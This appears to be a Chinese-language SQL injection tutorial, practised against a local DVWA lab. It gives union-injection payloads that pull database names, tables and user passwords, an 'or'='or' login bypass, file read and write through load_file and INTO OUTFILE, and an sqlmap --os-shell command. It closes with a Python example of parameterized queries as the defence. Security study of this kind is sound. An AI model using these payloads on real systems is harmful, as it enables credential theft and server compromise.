# python-network-programming
### SQL注入
#### 开启mysql日志功能
```text
mysql> show variables like 'general_log%'
    -> ;
+------------------+---------------------------------------------+
| Variable_name    | Value                                       |
+------------------+---------------------------------------------+
| general_log      | OFF                                         |
| general_log_file | c:\phpStudy\PHPTutorial\MySQL\data\test.log |
+------------------+---------------------------------------------+
2 rows in set (0.00 sec)

mysql> set global general_log = 'ON';
Query OK, 0 rows affected (0.02 sec)

mysql> show variables like 'general_log%';
+------------------+---------------------------------------------+
| Variable_name    | Value                                       |
+------------------+---------------------------------------------+
| general_log      | ON                                          |
| general_log_file | c:\phpStudy\PHPTutorial\MySQL\data\test.log |
+------------------+---------------------------------------------+
2 rows in set (0.00 sec)
```
#### 查看mysql日志
windows下使用baretail进行查看 [baretail下载地址](http://www.baremetalsoft.com/baretail/index.php)
#### sql注入原理
可以通过网站存在的查询语句进行构造，为此开发者对其伤透了脑筋，漏洞不光是查询，可能还存在与API、隐藏链接、http头数据、写入数据等。需要对数据包的结构和传递函数比较了解，建议学习的时候把数据库的日志打开，就可以查看到传递到数据库的语句是什么样子的了。 需要记住的information_schema数据库的SCHEMATA、TABLES、COLUMNS。 SCHEMATA表中存放所有数据库的名，字段名为SCHEMA_NAME。 关键函数database() 当前数据库名、version() 当前mysql版本、user()当前mysql用户.
#### 漏洞危害
高危漏洞,可以获取敏感信息，修改信息，脱裤，上传 webshell,执行命令。
#### mysql
默认库information_schema和其中的表SCHEMATA、TABLES和COLUMNS SCHEMATA 存储的是用户创建所有数据库的库名记录数据库库名的字段为SCHEMA_NAME  
select schema_name from information_schema.schemata 查询全部数据库  
select table_schema,table_name from information_schema.tables 查询全部数据库和表的对应  
select table_name,column_name from information_schema.columns; 查询全表对应的字段
#### asp站点万能密码
'or'='or'
#### union注入
1、首先判断是否有注入点?id=1' and 1=1#和?id=1' and 1=2，测试两个返回是否相同，如不同则含有注入漏洞    
2、判断字段数量 1' order by 1#，当返回错误，前一个数值即为最大字段量。  
3、得到字段个数后，进行union注入,id=1' union select 1,2# 如果都显示，说明两个字段都可以进行替换  
4、判断当前所使用的数据库1' union select version(),database()#  
5、查找需要的表 ?id=1' union select table_schema,table_name from information_schema.tables#，把所有数据库的库和表的对应显示出来。  
6、查找表对应的字段?id=1' union select table_name,column_name from information_schema.columns#  
7、查最终数据 ?id=1' union select user,password from dvwa.users#  
8、判断数据库版本1' and substring(@@version,1,1)=4# 如果返回正常结果，说明数据库版本是4.  
9、查询当前注入点的数据库用户union select user(),2#
```text
ID: 1' union select user(),2#
First name: admin
Surname: admin
ID: 1' union select user(),2#
First name: root@localhost
Surname: 2
```
10、读文件，写文件，没有配置–secure-file-priv
```text
show variables like '%secure%';
打开mysql的配置文件my.ini 然后在末尾加上secure-file-priv="" 重启就行了
```
```text
SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,load_file('c:\\test.txt')#'
select '123' into OUTFILE 'c:/123.txt';
```
11、使用sqlmap写入shell
```text
C:\soft\sqlmap>python sqlmap.py -u "http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p "id" --cookie "security=low; PHPSESSID=1n3rvc90rbafotfo5r0tmn80l1" -T users
 -C "user,password" --os-shell
```
***
12、oracle数据库注入
```text
oracle数据库进行注入测试时必须写from一个表
union select 1,2,3,4,5 from dual;
由于使用union查询oracle数据库时必须保证前后两个字段类型相同，为了不报错，可以使用Null占位，则为union select null,null,null,null,null from dual;
dual是oracle默认创建的表，由system账号创建
union select 的返回结果为排序去重
union all select 直接输出查询结果，不会排序去重
```
13、为什么参数化查询可以防止 sql 注入
```python
import pymysql

#连接数据库
connect = pymysql.connect(
    host='192.168.1.9',
    user='root',
    password='root',
    db='dvwa',
    port=3306,
    charset='utf8'
)

#正常查询
name = 'admin'
#注入查询
# name = 'admin\''+ ' or 1=1#'
with connect.cursor() as cursor:
    #危险查询方法，会造成SQL注入
    # query = "select * from users where user='%s'"%(name)
    #安全查询方法，使用execute的参数传递name值
    query = "select * from users where user=%s"
    count = cursor.execute(query,args=name)
    print("影响行数:",str(count))
    for row in cursor.fetchall():
        print(row)
    connect.commit()
#使用预编译的SQL语句，SQL语句的语义不会改变。
#在PHP中使用?进行占位
```

***
不定期分享一些python开发,逆向破解、渗透测试相关文章,欢迎大家关注.  
![微信公众号](../gongzhonghao.jpg)
***
BUG:dazhuang_python@sina.com